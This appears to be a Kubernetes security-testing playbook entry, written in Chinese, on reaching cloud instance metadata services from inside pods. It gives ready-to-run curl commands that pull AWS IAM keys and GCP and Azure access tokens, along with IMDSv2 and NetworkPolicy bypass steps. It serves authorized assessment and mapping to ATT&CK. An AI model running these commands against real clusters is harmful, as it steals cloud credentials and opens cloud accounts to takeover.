---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-3.2]
mapped_compliance_families: [CNI网络]
---

# 云元数据服务（IMDS）访问

## 1. 前置条件

- Pod 运行在云平台（AWS/GCP/Azure/阿里云）
- 云元数据服务 169.254.169.254 从 Pod 内可达
- 未配置 NetworkPolicy 阻止 Pod 到 169.254.169.254 的流量
- 无 IMDSv2 要求（或可获取 token）

## 2. 探测命令

- [L0] `kubectl get networkpolicies -A` → 期望：无阻止 169.254.169.254 的策略
- [L1] `kubectl exec <pod> -n <ns> -- curl -sk --connect-timeout 5 http://169.254.169.254/latest/meta-data/` → 期望：返回 AWS 元数据根目录列表
- [L1] `kubectl exec <pod> -n <ns> -- curl -sk --connect-timeout 5 http://169.254.169.254/metadata/instance?api-version=2021-02-01` → 期望：返回 Azure 元数据
- [L1] `kubectl exec <pod> -n <ns> -- curl -sk --connect-timeout 5 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/` → 期望：返回 GCP 元数据

## 3. 攻击验证

- [L2] AWS IMDSv1 访问临时凭证：
  `kubectl exec <pod> -n <ns> -- curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/` → 期望：返回 IAM 角色名
  `kubectl exec <pod> -n <ns> -- curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` → 期望：返回 AccessKeyId、SecretAccessKey、Token
- [L2] GCP 访问服务账户 token：
  `kubectl exec <pod> -n <ns> -- curl -sk -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` → 期望：返回 OAuth2 access_token
- [L2] Azure 访问托管身份 token：
  `kubectl exec <pod> -n <ns> -- curl -sk -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-04-01&resource=https://management.azure.com/"` → 期望：返回 access_token

## 4. 差分证明

- 攻击前 [L0]: NetworkPolicy 未阻止到 169.254.169.254 的流量
- 攻击后 [L2]: 从 Pod 内成功获取云凭证（AWS IAM / GCP SA / Azure MSI token）
- 攻击前 [L1]: 容器内无云凭证文件
- 攻击后 [L2]: 通过 IMDS 获取的凭证可访问云资源（如 S3 bucket、VM 管理接口）

## 5. 绕过策略

- 若 IMDSv2 强制启用：先获取 token 再访问元数据
  `kubectl exec <pod> -- curl -sk -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` → 获取 token
  `kubectl exec <pod> -- curl -sk http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: <token>"` → 使用 token 访问
- 若 NetworkPolicy 阻止直接访问 169.254.169.254：检查是否有可用于代理的 Pod
- 若云平台使用不同元数据 IP：阿里云 100.100.100.200、DigitalOcean 169.254.169.254/metadata/v1

## 6. 证伪条件

- [L1] `curl -sk --connect-timeout 5 http://169.254.169.254/` 返回连接超时或拒绝 → 证伪
- [L0] NetworkPolicy 明确阻止到 169.254.169.254 的流量 → 证伪
- [L1] Pod 不在云平台上运行（纯裸机/VM 环境）→ 证伪
- [L2] IMDSv2 token 获取失败且 v1 被禁用 → 证伪

## 7. 审批级别

Level 2：探测命令（curl 访问元数据端点）自动通过。
Level 2：攻击验证（获取临时凭证）自动通过。
destructive: false

## 8. MITRE ATT&CK

T1552.005 - Unsecured Credentials: Cloud Instance Metadata API